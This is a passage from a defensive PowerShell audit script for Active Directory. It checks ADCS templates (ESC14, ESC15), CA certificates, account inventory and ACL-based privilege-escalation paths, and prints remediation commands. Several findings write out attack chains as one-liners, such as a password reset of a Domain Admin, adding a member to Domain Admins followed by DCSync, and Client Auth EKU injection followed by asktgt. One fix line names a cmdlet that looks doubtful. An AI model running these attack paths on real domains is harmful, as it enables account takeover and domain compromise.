Get-ADObject -LDAPFilter '(altSecurityIdentities=*)' -Properties altSecurityIdentities | Select Name,altSecurityIdentities
"@ `
        -MITRE "T1484" -CIS "8.8" -Pts 0 -Max 4
    Write-Host "  [!] ESC14 altSecIds risks: $($esc14Risks.Count) ACE(s)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# ESC15 -- EKUwu: Schema Version 1 Template EKU Override
#
# Certificate templates with msPKI-Template-Schema-Version = 1 do not prevent
# the requestor from including arbitrary Application Policies extensions in
# their CSR. The CA honours the requestor-supplied EKUs in addition to (or
# instead of) the template's configured EKUs.
#
# Attack: enroll in a non-auth-purpose v1 template; inject Client Authentication
# OID (1.3.6.1.5.5.7.3.2) in the CSR Application Policies extension -> issued
# cert has Client Auth -> PKINIT as requesting user -> TGT.
#
# Conditions: Schema v1 AND unprivileged enroll AND no manager approval.
# MITRE T1649
# -----------------------------------------------------------------------------

# EKUs that already grant auth capability -- ESC15 not the novel path on these
$authEKUs = @(
    '1.3.6.1.5.5.7.3.2',           # Client Authentication
    '1.3.6.1.4.1.311.20.2.2',      # Smart Card Logon
    '1.3.6.1.5.2.3.4',             # PKINIT Client Auth
    '2.5.29.37.0',                  # Any Purpose
    '1.3.6.1.4.1.311.10.3.1'       # Certificate Request Agent
)
$ENROLL_EXT_GUID = [guid]'0e10c968-78fb-11d2-90d4-00c04f79dc55'

$esc15Templates = @($advTemplates | Where-Object {
    $t = $_
    # Schema version 1 only
    ([int]($t.'msPKI-Template-Schema-Version') -eq 1) -and
    # No manager approval
    (-not ([int]($t.'msPKI-RA-Signature') -gt 0)) -and
    # Template not already trivially dangerous via auth EKUs
    (-not (@($t.pKIExtendedKeyUsage) | Where-Object { $authEKUs -contains $_ })) -and
    # Unprivileged principal has Enroll right
    ($t.nTSecurityDescriptor -and (@($t.nTSecurityDescriptor.Access) | Where-Object {
        $_.AccessControlType -eq 'Allow' -and
        $_.ObjectType -eq $ENROLL_EXT_GUID -and
        $_.IdentityReference.Value -match $unprivPattern
    }))
})

if ($esc15Templates.Count -eq 0) {
    Add-Finding "ADCSAdvanced" "ESC15 -- EKUwu Schema v1" "Good" `
        "No schema version 1 templates with unprivileged enrollment and non-auth EKUs found" -Pts 4 -Max 4
} else {
    Add-Finding "ADCSAdvanced" "ESC15 -- EKUwu: Schema v1 Template EKU Injection" "Critical" `
        "$($esc15Templates.Count) schema version 1 template(s) allow unprivileged enrollment. CSR Application Policies extension can inject Client Authentication EKU -- enabling PKINIT as the requesting user even though the template was never intended for authentication." `
        -Resources ($esc15Templates.Name) `
        -AttackPath "Craft CSR with Application Policies OID 1.3.6.1.5.5.7.3.2 (Client Auth) -> enroll in v1 template -> CA issues cert with Client Auth EKU injected -> $($script:T.RB) asktgt with cert -> TGT as self" `
        -Fix @"
# Option 1 (preferred): Duplicate template at schema version 2 or 4 in GPMC,
#   then depublish the v1 template and delete the old object.
#
# Option 2: Restrict enrollment to specific authorised accounts:
`$acl = Get-Acl 'AD:\TEMPLATE_DN'
`$enrollGuid = [guid]'0e10c968-78fb-11d2-90d4-00c04f79dc55'
`$acl.Access | Where-Object {
    `$_.ObjectType -eq `$enrollGuid -and
    `$_.IdentityReference.Value -match 'Domain Users|Authenticated Users|Everyone'
} | ForEach-Object { `$acl.RemoveAccessRule(`$_) | Out-Null }
Set-Acl 'AD:\TEMPLATE_DN' `$acl
"@ `
        -MITRE "T1649" -CIS "8.9" -Pts 0 -Max 4
    Write-Host "  [!] ESC15 schema v1 templates: $($esc15Templates.Name -join ', ')" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# CA Certificate Hygiene -- expiry, key size, algorithm (bonus checks)
# -----------------------------------------------------------------------------
foreach ($ca in $caObjects) {
    if (-not $ca.cACertificate) { continue }
    try {
        $caCert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new(
                      @($ca.cACertificate)[0])
        $daysLeft  = [int]($caCert.NotAfter - (Get-Date)).TotalDays
        $keySize   = try { $caCert.PublicKey.Key.KeySize } catch { 0 }
        $algorithm = $caCert.PublicKey.Oid.FriendlyName

        if ($caCert.NotAfter -lt (Get-Date)) {
            Add-Finding "ADCSAdvanced" "CA Certificate EXPIRED -- $($ca.Name)" "Critical" `
                "CA '$($ca.Name)' certificate EXPIRED on $($caCert.NotAfter). All issued certs chain to an expired root -- trust validation broken." `
                -Fix "Renew CA cert: certutil -renewCert ReuseKeys on $($ca.dNSHostName). Or decommission CA." `
                -MITRE "T1649" -Pts 0 -Max 3
        } elseif ($daysLeft -lt 60) {
            Add-Finding "ADCSAdvanced" "CA Certificate Expiring Soon -- $($ca.Name)" "High" `
                "CA '$($ca.Name)' certificate expires in $daysLeft day(s) ($($caCert.NotAfter)). Plan renewal immediately." `
                -Fix "certutil -renewCert ReuseKeys on $($ca.dNSHostName)" -Pts 0 -Max 3
        } elseif ($daysLeft -lt 180) {
            Add-Finding "ADCSAdvanced" "CA Certificate Expiry Warning -- $($ca.Name)" "Medium" `
                "CA '$($ca.Name)' expires in $daysLeft day(s). Plan renewal." -Pts 1 -Max 3
        } else {
            Add-Finding "ADCSAdvanced" "CA Certificate Valid -- $($ca.Name)" "Good" `
                "CA cert expires: $($caCert.NotAfter) ($daysLeft days). Algorithm: $algorithm. KeySize: $keySize" -Pts 3 -Max 3
        }

        if ($keySize -in @(512,768,1024)) {
            Add-Finding "ADCSAdvanced" "CA Weak Key Size -- $($ca.Name)" "Critical" `
                "CA '$($ca.Name)' uses $keySize-bit $algorithm key -- considered broken. Certificates can be forged." `
                -Fix "Migrate to new CA with RSA-4096 or ECDSA P-384. No in-place upgrade -- requires new CA hierarchy." `
                -MITRE "T1649" -Pts 0 -Max 3
        }
    } catch { <# certificate decode failure -- non-fatal #> }
}

} # end if ($adcsAvail)

# ===============================================================================
# DOMAIN 26 -- IDENTITY INVENTORY & ACCOUNT CLASSIFICATION
# ===============================================================================
# Phase 2 Objective: Full inventory of user, service, computer accounts and groups.
# Classifies accounts by type, detects legacy/risky patterns, evaluates whether
# account types match their assigned privileges. Feeds directly into Domains 27-30.
# ===============================================================================
Write-Section "26. IDENTITY INVENTORY & ACCOUNT CLASSIFICATION"

# -- Build the master identity inventory used by Domains 27-30 ----------------
$script:AllUsers      = @()
$script:AllComputers  = @()
$script:AllGroups     = @()
$script:ServiceAccounts = @()
$script:AdminAccounts   = @()

try {
    $script:AllUsers = @(Get-ADUser -Filter * @dcParam -ErrorAction Stop `
        -Properties SamAccountName, DisplayName, Enabled, PasswordLastSet,
                    PasswordNeverExpires, LastLogonDate, Created, Description,
                    MemberOf, AdminCount, ServicePrincipalName,
                    'msDS-SupportedEncryptionTypes', UserAccountControl,
                    ObjectSID, DistinguishedName, UserPrincipalName,
                    'msDS-KeyCredentialLink', TrustedForDelegation,
                    TrustedToAuthForDelegation)
}
catch [System.UnauthorizedAccessException] { Write-AuditWarning "Identity Inventory -- users" "Access Denied" "IdentityInventory" }
catch { Write-AuditWarning "Identity Inventory -- users" $_.Exception.Message "IdentityInventory" }

try {
    $script:AllComputers = @(Get-ADComputer -Filter * @dcParam -ErrorAction Stop `
        -Properties Name, Enabled, OperatingSystem, LastLogonDate, Created,
                    ServicePrincipalName, MemberOf, Description,
                    TrustedForDelegation, TrustedToAuthForDelegation,
                    'msDS-AllowedToActOnBehalfOfOtherIdentity',
                    'msDS-KeyCredentialLink', PasswordLastSet, DistinguishedName)
}
catch [System.UnauthorizedAccessException] { Write-AuditWarning "Identity Inventory -- computers" "Access Denied" "IdentityInventory" }
catch { Write-AuditWarning "Identity Inventory -- computers" $_.Exception.Message "IdentityInventory" }

try {
    $script:AllGroups = @(Get-ADGroup -Filter * @dcParam -ErrorAction Stop `
        -Properties Name, GroupScope, GroupCategory, ManagedBy,
                    Members, MemberOf, Description, DistinguishedName,
                    'adminCount', whenCreated, whenChanged)
}
catch [System.UnauthorizedAccessException] { Write-AuditWarning "Identity Inventory -- groups" "Access Denied" "IdentityInventory" }
catch { Write-AuditWarning "Identity Inventory -- groups" $_.Exception.Message "IdentityInventory" }

# -- Classify accounts ---------------------------------------------------------
$servicePattern  = '^svc[_\-]|[_\-]svc$|^sa[_\-]|service|^svc$|\$$'
# adminPattern: all tokens require a delimiter or anchor.
# '^admin' (bare) was removed -- it matched 'admintest', 'administrator123' etc.
# Now requires '^admin$' (exact) or '^admin[_-]' (admin_ prefix) or '[_-]admin$' (suffix).
$adminPattern    = '^adm[_\-]|[_\-]adm$|^admin$|^admin[_\-]|[_\-]admin$|^t0[_\-]|^tier0[_\-]|^priv[_\-]|[_\-]priv$'

$sharedPattern   = 'shared|generic|common|team|helpdesk|support|it[_\-]support|noc|soc'

# testPattern: unanchored 'test'/'temp'/'tmp' matched legitimate accounts containing
# those as substrings (e.g. 'user_template', 'qa_test_analyst', 'temporary_contractor').
# All tokens now require leading/trailing delimiter or anchor.
$testPattern     = '^test[_\-]|[_\-]test$|^test$|^temp[_\-]|[_\-]temp$|^tmp[_\-]|[_\-]tmp$|^demo[_\-]|[_\-]demo$|^trial[_\-]|^lab[_\-]|[_\-]lab$|^poc[_\-]|[_\-]poc$|^sandbox[_\-]|[_\-]sandbox$'
$defaultPattern  = '^(Guest|DefaultAccount|WDAGUtilityAccount|krbtgt)$'

$script:ServiceAccounts = @($script:AllUsers | Where-Object {
    $_.SamAccountName -match $servicePattern -or $_.ServicePrincipalName
})
$script:AdminAccounts = @($script:AllUsers | Where-Object {
    $_.SamAccountName -match $adminPattern -or $_.AdminCount -eq 1
})
$sharedAccounts  = @($script:AllUsers | Where-Object {
    $_.SamAccountName -match $sharedPattern -and $_.Enabled -eq $true
})
$testAccounts    = @($script:AllUsers | Where-Object {
    $_.SamAccountName -match $testPattern -and $_.Enabled -eq $true
})

# -- 26.1 Identity estate summary (Info) ---------------------------------------
Add-Finding "IdentityInventory" "Identity Estate Summary" "Info" `
    "Users:$($script:AllUsers.Count) (Enabled:$(@($script:AllUsers|Where-Object Enabled).Count)) | Computers:$($script:AllComputers.Count) | Groups:$($script:AllGroups.Count) | ServiceAccts:$($script:ServiceAccounts.Count) | AdminAccts:$($script:AdminAccounts.Count)" `
    -Pts 0 -Max 0

# -- 26.2 Guest account enabled ------------------------------------------------
try {
    $guestAcct = Get-ADUser -Identity "Guest" @dcParam -Properties Enabled,LastLogonDate -ErrorAction Stop
    if ($guestAcct.Enabled) {
        Add-Finding "IdentityInventory" "Guest Account Enabled" "High" `
            "Built-in Guest account is enabled. Any unauthenticated user can access domain-joined resources and enumerate AD objects." `
            -Resources @('Guest') `
            -Fix "Disable-ADAccount -Identity Guest" `
            -MITRE "T1078.001" -CIS "2.1.2" -Pts 0 -Max 3
    } else {
        Add-Finding "IdentityInventory" "Guest Account Disabled" "Good" "Built-in Guest account is disabled" -Pts 3 -Max 3
    }
}
catch { Write-AuditWarning "26.2 Guest account" $_.Exception.Message "IdentityInventory" }

# -- 26.3 Default Administrator account -- renamed and last logon ----------------
try {
    $builtinAdmin = Get-ADUser -Filter { SID -like "*-500" } @dcParam `
                        -Properties SamAccountName, Enabled, LastLogonDate, PasswordLastSet -ErrorAction Stop |
                    Select-Object -First 1
    if ($builtinAdmin) {
        $adminRenamed = $builtinAdmin.SamAccountName -ne 'Administrator'
        $lastLogon    = $builtinAdmin.LastLogonDate
        if (-not $adminRenamed) {
            Add-Finding "IdentityInventory" "Default Administrator Not Renamed" "Medium" `
                "Built-in Administrator account retains default name 'Administrator' (RID 500). Predictable target for password spray and brute-force." `
                -Fix "Rename-ADObject (Get-ADUser Administrator).DistinguishedName -NewName 'BreakGlass01'. Also set a decoy 'Administrator' account with no real rights." `
                -MITRE "T1078.002" -CIS "2.2.1" -Pts 0 -Max 2
        } else {
            Add-Finding "IdentityInventory" "Default Administrator Renamed" "Good" "RID-500 account renamed to '$($builtinAdmin.SamAccountName)'" -Pts 2 -Max 2
        }
        if ($lastLogon -and $lastLogon -gt (Get-Date).AddDays(-30)) {
            Add-Finding "IdentityInventory" "RID-500 Recent Logon" "High" `
                "Built-in Administrator (RID 500) had an interactive logon within 30 days ($lastLogon). Break-glass accounts should only be used in emergencies." `
                -Resources @($builtinAdmin.SamAccountName) `
                -Fix "Alert on Event ID 4624 for RID-500 SID. RID-500 logons should trigger immediate SOC investigation." `
                -MITRE "T1078.002" -Pts 0 -Max 3
        }
    }
}
catch { Write-AuditWarning "26.3 Default Admin account" $_.Exception.Message "IdentityInventory" }

# -- 26.4 Service accounts not using gMSA --------------------------------------
try {
    $gmsaAccounts = @(Get-ADServiceAccount -Filter * @dcParam -ErrorAction Stop)
    $svcNotGmsa   = @($script:ServiceAccounts | Where-Object {
        $_.SamAccountName -notmatch '\$$' -and   # not a computer/gMSA account (ends in $)
        $_.SamAccountName -notin $gmsaAccounts.SamAccountName
    })
    if ($svcNotGmsa.Count -gt 0) {
        Add-Finding "IdentityInventory" "Service Accounts Not Using gMSA" "Medium" `
            "$($svcNotGmsa.Count) service account(s) detected by naming convention but not using group Managed Service Accounts. Manual passwords = Kerberoastable, stale, or shared credentials." `
            -Resources ($svcNotGmsa.SamAccountName) `
            -Fix "Migrate to gMSA: New-ADServiceAccount -Name 'svc_app' -ManagedPasswordIntervalInDays 30 -DNSHostName 'app.domain.com'. gMSA passwords auto-rotate every 30 days and are never exposed to humans." `
            -MITRE "T1558.003" -Pts 0 -Max 3
    } else {
        Add-Finding "IdentityInventory" "Service Account gMSA Coverage" "Good" `
            "All detected service accounts are using gMSA or system-managed accounts" -Pts 3 -Max 3
    }
}
catch { Write-AuditWarning "26.4 gMSA coverage" $_.Exception.Message "IdentityInventory" }

# -- 26.5 Shared / generic accounts active -------------------------------------
if ($sharedAccounts.Count -gt 0) {
    Add-Finding "IdentityInventory" "Shared / Generic Accounts Enabled" "High" `
        "$($sharedAccounts.Count) account(s) with shared/generic naming patterns are enabled. Shared accounts prevent individual accountability and are common persistence mechanisms." `
        -Resources ($sharedAccounts.SamAccountName) `
        -Fix "Replace shared accounts with individual named accounts or gMSA. If shared access required, use PAM solution with session recording. Audit: who has credentials for these accounts?" `
        -MITRE "T1078" -CIS "16.9" -Pts 0 -Max 4
} else {
    Add-Finding "IdentityInventory" "Shared Account Hygiene" "Good" "No enabled accounts with shared/generic naming patterns detected" -Pts 4 -Max 4
}

# -- 26.6 Test / temp / lab accounts active ------------------------------------
if ($testAccounts.Count -gt 0) {
    $testWithPriv =@( @($testAccounts | Where-Object { $_.AdminCount -eq 1 }))
    $sev = if ($testWithPriv.Count -gt 0) { 'Critical' } else { 'Medium' }
    Add-Finding "IdentityInventory" "Test / Temporary Accounts Enabled" $sev `
        "$($testAccounts.Count) enabled account(s) with test/temp naming ($($testWithPriv.Count) have AdminCount=1). Test accounts are frequently forgotten, un-audited, and targeted." `
        -Resources ($testAccounts.SamAccountName) `
        -Fix "Disable or delete all test/temp/lab accounts. If required for testing, set account expiry: Set-ADAccountExpiration -Identity TEST_ACCT -DateTime (Get-Date).AddDays(30)" `
        -MITRE "T1078" -Pts 0 -Max 3
}

# -- 26.7 Accounts with UPN suffix mismatch (shadow accounts indicator) ---------
try {
    $domainFQDN_Upper = $domFQDN.ToLower()
    $upnMismatch = @($script:AllUsers | Where-Object {
        $_.Enabled -eq $true -and
        $_.UserPrincipalName -and
        $_.UserPrincipalName -notmatch "@$([regex]::Escape($domainFQDN_Upper))" -and
        $_.UserPrincipalName -notmatch "@$([regex]::Escape($forest.Name.ToLower()))"
    })
    if ($upnMismatch.Count -gt 0) {
        Add-Finding "IdentityInventory" "UPN Suffix Mismatch" "Medium" `
            "$($upnMismatch.Count) enabled user(s) have UPN suffixes not matching this domain/forest. May indicate shadow accounts, legacy migration remnants, or misconfiguration." `
            -Resources ($upnMismatch | ForEach-Object { "$($_.SamAccountName) UPN:$($_.UserPrincipalName)" }) `
            -Fix "Audit UPN suffixes. Update: Set-ADUser -Identity SAMACCOUNT -UserPrincipalName 'user@domain.com'. Remove unauthorized UPN suffixes: Remove-ADForestGlobalCatalog -Domain..." `
            -MITRE "T1078" -Pts 0 -Max 2
    }
}
catch { Write-AuditWarning "26.7 UPN mismatch" $_.Exception.Message "IdentityInventory" }

# -- 26.8 Legacy OS computers still domain-joined ------------------------------
$legacyOS = @($script:AllComputers | Where-Object {
    $_.Enabled -eq $true -and $_.OperatingSystem -match
    'Windows XP|Windows 7|Windows Vista|2003|2008|Server 2000|Windows 2000'
})
if ($legacyOS.Count -gt 0) {
    Add-Finding "IdentityInventory" "Legacy OS Domain Members" "Critical" `
        "$($legacyOS.Count) domain-joined computer(s) running end-of-life OS. Unpatched systems are trivially exploitable and serve as persistent footholds." `
        -Resources ($legacyOS | ForEach-Object { "$($_.Name) [$($_.OperatingSystem)]" }) `
        -AttackPath "$($script:T.EB)/$($script:T.BK)/PrintNightmare on unpatched legacy host -> SYSTEM -> harvest cached credentials -> lateral movement" `
        -Fix "Isolate legacy hosts in a restricted VLAN with no lateral movement paths. Accelerate decommission plan. If required, apply MS17-010 mitigations and disable SMBv1." `
        -MITRE "T1190" -CIS "2.5" -Pts 0 -Max 5
} else {
    Add-Finding "IdentityInventory" "OS Currency" "Good" "No legacy EOL operating systems detected in domain-joined computers" -Pts 5 -Max 5
}

# ===============================================================================
# DOMAIN 27 -- TRANSITIVE PRIVILEGE ESCALATION PATHS
# ===============================================================================
# Models how an attacker/insider with limited access can reach Domain Admin
# through ACL misconfigurations, transitive group memberships, delegation
# rights, and object ownership chains -- without exploiting any CVE.
# ===============================================================================
Write-Section "27. TRANSITIVE PRIVILEGE ESCALATION PATHS"

# Privileged group DNs (built once, reused across all checks below)
$privGroupDNs = @{}
foreach ($grpName in @('Domain Admins','Enterprise Admins','Schema Admins',
                        'Administrators','Group Policy Creator Owners',
                        'Account Operators','Backup Operators','Server Operators',
                        'Print Operators','DnsAdmins')) {
    try {
        $g = Get-ADGroup -Identity $grpName @dcParam -ErrorAction Stop
        $privGroupDNs[$grpName] = $g.DistinguishedName
    } catch {}
}

$escalationAuthorisedPattern = 'Domain Admins|Enterprise Admins|SYSTEM|Administrators|' +
                                'NT AUTHORITY|Creator Owner|Key Admins'

# -----------------------------------------------------------------------------
# 27.1 ForceChangePassword on AdminCount=1 accounts
# An attacker with this right can reset a DA's password without knowing the
# current password -- instant privilege escalation via credential replacement.
# Extended Right GUID: 00299570-246d-11d0-a768-00aa006e0529
# -----------------------------------------------------------------------------
$FORCE_PW_GUID  = [guid]'00299570-246d-11d0-a768-00aa006e0529'
$forcePwRisks   = [System.Collections.Generic.List[string]]::new()

try {
    $adminCountUsers =@( @($script:AllUsers | Where-Object { $_.AdminCount -eq 1 -and $_.Enabled }))
    foreach ($user in $adminCountUsers) {
        try {
            $acl = Get-Acl "AD:\$($user.DistinguishedName)" -ErrorAction Stop
            $fpAces =@( @($acl.Access) | Where-Object {
                $_.AccessControlType -eq 'Allow' -and
                $_.ObjectType        -eq $FORCE_PW_GUID -and
                $_.IdentityReference.Value -notmatch $escalationAuthorisedPattern
            })
            foreach ($ace in $fpAces) {
                $forcePwRisks.Add("Target:$($user.SamAccountName) | Attacker:$($ace.IdentityReference.Value) | Right:ForceChangePassword")
            }
        } catch {}
    }
}
catch { Write-AuditWarning "27.1 ForceChangePassword paths" $_.Exception.Message "PrivEscPaths" }

if ($forcePwRisks.Count -eq 0) {
    Add-Finding "PrivEscPaths" "ForceChangePassword on Privileged Accounts" "Good" `
        "No non-admin principals have ForceChangePassword right on AdminCount=1 accounts" -Pts 5 -Max 5
} else {
    Add-Finding "PrivEscPaths" "ForceChangePassword -- Direct DA Takeover Path" "Critical" `
        "$($forcePwRisks.Count) ACE(s) grant non-admin principals ForceChangePassword on privileged accounts. No current password required -- immediate account takeover." `
        -Resources $forcePwRisks `
        -AttackPath "net user administrator NewPass123! /domain (or Set-ADAccountPassword -Reset) -> log in as DA -> instant domain compromise. Detectable only if 4723/4724 events monitored." `
        -Fix @"
# Remove ForceChangePassword ACE for each affected principal:
`$acl = Get-Acl 'AD:\TARGET_DN'
`$fwpGuid = [guid]'00299570-246d-11d0-a768-00aa006e0529'
`$acl.Access | Where-Object { `$_.ObjectType -eq `$fwpGuid -and
    `$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM' } |
    ForEach-Object { `$acl.RemoveAccessRule(`$_) | Out-Null }
Set-Acl 'AD:\TARGET_DN' `$acl
"@ `
        -MITRE "T1098.002" -CIS "9.4" -Pts 0 -Max 5
    Write-Host "  [!] ForceChangePassword escalation paths: $($forcePwRisks.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# 27.2 GenericAll / GenericWrite / AddMember on privileged groups
# Direct write to a privileged group = instant membership escalation.
# WriteProperty on the 'member' attribute GUID: bf9679c0-0de6-11d0-a285-00aa003049e2
# -----------------------------------------------------------------------------
$MEMBER_ATTR_GUID  = [guid]'bf9679c0-0de6-11d0-a285-00aa003049e2'
$groupWriteRisks   = [System.Collections.Generic.List[string]]::new()

foreach ($grpName in $privGroupDNs.Keys) {
    $grpDN = $privGroupDNs[$grpName]
    try {
        $acl = Get-Acl "AD:\$grpDN" -ErrorAction Stop
        foreach ($ace in $acl.Access) {
            if ($ace.AccessControlType -ne 'Allow') { continue }
            if ($ace.IdentityReference.Value -match $escalationAuthorisedPattern) { continue }

            $isWrite = ($ace.ActiveDirectoryRights -band 'GenericAll')     -or
                       ($ace.ActiveDirectoryRights -band 'GenericWrite')   -or
                       ($ace.ActiveDirectoryRights -band 'WriteDacl')      -or
                       ($ace.ActiveDirectoryRights -band 'WriteOwner')     -or
                       (($ace.ActiveDirectoryRights -band 'WriteProperty') -and
                        ($ace.ObjectType -eq $MEMBER_ATTR_GUID -or $ace.ObjectType -eq [guid]::Empty))

            if ($isWrite) {
                $wtype = if ($ace.ActiveDirectoryRights -band 'GenericAll')  { 'GenericAll' }
                         elseif ($ace.ActiveDirectoryRights -band 'GenericWrite') { 'GenericWrite' }
                         elseif ($ace.ObjectType -eq $MEMBER_ATTR_GUID) { 'WriteProperty[member]' }
                         else { $ace.ActiveDirectoryRights.ToString() }
                $groupWriteRisks.Add("Group:$grpName | Principal:$($ace.IdentityReference.Value) | Right:$wtype")
            }
        }
    } catch {}
}

if ($groupWriteRisks.Count -eq 0) {
    Add-Finding "PrivEscPaths" "Privileged Group Write ACLs" "Good" `
        "No non-admin principals have write access to privileged group objects" -Pts 6 -Max 6
} else {
    Add-Finding "PrivEscPaths" "Direct Privileged Group Write -- Instant Escalation" "Critical" `
        "$($groupWriteRisks.Count) non-admin principal(s) can add members to privileged groups via GenericAll/GenericWrite/WriteProperty[member]. Single step to Domain Admin." `
        -Resources $groupWriteRisks `
        -AttackPath "Add-ADGroupMember 'Domain Admins' -Members attacker -> DA -> DCSync -> all hashes. Or take ownership, modify DACL, add self." `
        -Fix "Run: Get-Acl 'AD:\DA_GROUP_DN' | remove non-admin write ACEs. Audit all privileged group ACLs monthly." `
        -MITRE "T1098.002" -CIS "9.5" -Pts 0 -Max 6
    Write-Host "  [!] Privileged group write risks: $($groupWriteRisks.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# 27.3 Transitive group membership -- non-obvious paths to privileged groups
# Detects groups that are themselves members of DA/EA through nesting chains.
# Tracks up to 3 hops: Principal -> GroupA -> GroupB -> PrivilegedGroup
# -----------------------------------------------------------------------------
$transitiveRisks = [System.Collections.Generic.List[string]]::new()

try {
    foreach ($grpName in @('Domain Admins','Enterprise Admins','Administrators')) {
        $grpDN = $privGroupDNs[$grpName]
        if (-not $grpDN) { continue }

        # Get all recursive members -- AD handles the transitive resolution
        $recursiveMembers = @(Get-ADGroupMember -Identity $grpDN -Recursive @dcParam -ErrorAction Stop)

        # Get direct members only
        $directMembers    = @(Get-ADGroupMember -Identity $grpDN @dcParam -ErrorAction Stop)
        $directDNs        = $directMembers.DistinguishedName

        # Recursive members not in direct = reached via nested groups
        $transitiveMembers = @($recursiveMembers | Where-Object {
            $_.DistinguishedName -notin $directDNs -and
            $_.objectClass -eq 'user'
        })

        foreach ($m in ($transitiveMembers | Select-Object -First 30)) {
            # Find which intermediate group introduced this member
            $memberOf = @(Get-ADUser -Identity $m.DistinguishedName -Properties MemberOf `
                              @dcParam -ErrorAction SilentlyContinue).MemberOf
            $viaGroups = @($directMembers | Where-Object {
                $_.objectClass -eq 'group' -and
                ($memberOf -contains $_.DistinguishedName -or
                 (Get-ADGroupMember -Identity $_.DistinguishedName -Recursive `
                      @dcParam -ErrorAction SilentlyContinue |
                  Where-Object { $_.DistinguishedName -eq $m.DistinguishedName }))
            } | Select-Object -First 2)
            $viaStr = if ($viaGroups) { " via:[$($viaGroups.Name -join ']->[')]" } else { " via:nested" }
            $transitiveRisks.Add("User:$($m.SamAccountName) -> $grpName$viaStr")
        }
    }
}
catch { Write-AuditWarning "27.3 Transitive membership" $_.Exception.Message "PrivEscPaths" }

if ($transitiveRisks.Count -gt 0) {
    Add-Finding "PrivEscPaths" "Transitive Privileged Group Membership" "High" `
        "$($transitiveRisks.Count) user(s) are members of Domain Admins/Enterprise Admins/Administrators through nested group chains. Nested membership is frequently unreviewed and persists unnoticed." `
        -Resources ($transitiveRisks | Select-Object -First 40) `
        -Fix "Flatten group nesting for privileged groups. No groups should be members of DA/EA/Administrators -- only individual named accounts. Review: Get-ADGroupMember 'Domain Admins' -Recursive | Where objectClass -eq 'group'" `
        -MITRE "T1078.002" -CIS "2.7" -Pts 0 -Max 4
    Write-Host "  [!] Transitive DA/EA paths: $($transitiveRisks.Count) user(s)" -ForegroundColor DarkYellow
} else {
    Add-Finding "PrivEscPaths" "Transitive Group Membership" "Good" `
        "No users reach privileged groups through nested group chains" -Pts 4 -Max 4
}

# -----------------------------------------------------------------------------
# 27.4 OU delegation over privileged-account containers
# If an attacker can write to the OU that holds Domain Controllers or
# AdminCount=1 accounts, they can modify those account objects directly.
# -----------------------------------------------------------------------------
$ouDelegRisks = [System.Collections.Generic.List[string]]::new()

# OUs of interest: DC container + OUs containing AdminCount=1 users
$critOUs = [System.Collections.Generic.List[string]]::new()
$critOUs.Add("OU=Domain Controllers,$domainDN")

try {
    $script:AdminAccounts | Where-Object { $_.Enabled } | ForEach-Object {
        $ou = $_.DistinguishedName -replace '^[^,]+,',''
        if ($ou -notin $critOUs) { $critOUs.Add($ou) }
    }
}
catch {}

foreach ($ou in ($critOUs | Sort-Object -Unique | Select-Object -First 20)) {
    try {
        $ouACL = Get-Acl "AD:\$ou" -ErrorAction Stop
        $riskyOUAces =@( @($ouACL.Access) | Where-Object {
            $ace = $_
            $ace.AccessControlType -eq 'Allow' -and
            ($ace.ActiveDirectoryRights -band 'GenericAll'    -or
             $ace.ActiveDirectoryRights -band 'GenericWrite'  -or
             $ace.ActiveDirectoryRights -band 'WriteProperty' -or
             $ace.ActiveDirectoryRights -band 'WriteDacl'     -or
             $ace.ActiveDirectoryRights -band 'CreateChild'   -or
             $ace.ActiveDirectoryRights -band 'DeleteChild') -and
            $ace.IdentityReference.Value -notmatch $escalationAuthorisedPattern -and
            $ace.IsInherited -eq $false   # explicit delegations only
        })
        foreach ($ace in $riskyOUAces) {
            $ouShort = $ou -replace ',DC=.*','' -replace 'OU=',''
            $ouDelegRisks.Add("OU:$ouShort | Principal:$($ace.IdentityReference.Value) | Right:$($ace.ActiveDirectoryRights)")
        }
    } catch {}
}

if ($ouDelegRisks.Count -eq 0) {
    Add-Finding "PrivEscPaths" "OU Delegation on Privileged Containers" "Good" `
        "No unexpected delegation found on OUs containing DCs or privileged accounts" -Pts 5 -Max 5
} else {
    Add-Finding "PrivEscPaths" "OU Delegation -- Privileged Container Write Access" "Critical" `
        "$($ouDelegRisks.Count) explicit delegation ACE(s) on OUs containing DCs or AdminCount=1 accounts. OU write = modify any account/computer object within it." `
        -Resources $ouDelegRisks `
        -AttackPath "Write to DC OU -> disable computer account or modify LAPS attribute -> deny service / read admin password -> lateral movement to DC" `
        -Fix "Remove explicit non-admin delegation from privileged OUs. Use AD Delegation Wizard audit: dsacls 'OU=Domain Controllers,$domainDN' /I:T" `
        -MITRE "T1222.001" -CIS "9.6" -Pts 0 -Max 5
    Write-Host "  [!] OU delegation escalation paths: $($ouDelegRisks.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# 27.5 WriteDACL / WriteOwner on domain root or critical objects
# WriteDACL = can grant self DCSync. WriteOwner = take ownership -> full control.
# These are the most powerful non-member escalation paths in AD.
# -----------------------------------------------------------------------------
$writeDACLRisks = [System.Collections.Generic.List[string]]::new()

$criticalObjects = @(
    @{ DN = $domainDN;                                  Label = 'Domain Root' }
    @{ DN = "CN=AdminSDHolder,CN=System,$domainDN";    Label = 'AdminSDHolder' }
    @{ DN = "CN=Schema,$configNC";                      Label = 'Schema Container' }
    @{ DN = "CN=Services,$configNC";                    Label = 'Services Container' }
)
foreach ($grpName in @('Domain Admins','Enterprise Admins')) {
    if ($privGroupDNs[$grpName]) {
        $criticalObjects += @{ DN = $privGroupDNs[$grpName]; Label = $grpName }
    }
}

foreach ($obj in $criticalObjects) {
    try {
        $objACL = Get-Acl "AD:\$($obj.DN)" -ErrorAction Stop
        $aces =@( @($objACL.Access) | Where-Object {
            $_.AccessControlType -eq 'Allow' -and
            ($_.ActiveDirectoryRights -band 'WriteDacl' -or
             $_.ActiveDirectoryRights -band 'WriteOwner') -and
            $_.IdentityReference.Value -notmatch $escalationAuthorisedPattern
        })
        foreach ($ace in $aces) {
            $right = if ($ace.ActiveDirectoryRights -band 'WriteDacl') { 'WriteDACL' } else { 'WriteOwner' }
            $writeDACLRisks.Add("Object:$($obj.Label) | Principal:$($ace.IdentityReference.Value) | Right:$right")
        }
    } catch {}
}

if ($writeDACLRisks.Count -eq 0) {
